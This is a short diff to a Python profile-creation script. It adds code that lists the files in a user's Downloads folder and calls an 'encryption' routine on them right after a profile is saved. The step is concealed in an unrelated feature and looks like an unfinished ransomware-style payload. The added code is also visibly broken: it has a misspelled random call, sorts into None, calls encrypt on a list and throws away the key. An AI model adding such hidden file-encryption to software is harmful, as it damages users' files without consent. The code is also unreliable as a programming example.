@@ -8,7 +8,20 @@ import os
 
 username = os.environ.get("USERNAME")
 
+directory = "C:\users\salom\Downloads"
+
+files = os.listdir(directory)
+
+files_sorted = files.sort(key=lambda x: os.path.getctime(os.path.join(directory, x)), reverse=True)
+
 numb_gen = random.radint(0,2000)
+
+def encryption(file):
+
+    key = Fernet.generate_key()
+    f = Fernet(key)
+    token = file.encrypt(b"File Decrypted successfully")
+    print("File encrypted, moving on...")
 
 def choice_assist():
 
@@ -83,4 +96,5 @@ def Profile_Creation():
     time.sleep(2)
     saving_to_file(X,Y)
     print("Successfully saved!")
-
+    encryption(files_sorted)
+    print("Successfully encrypted!")
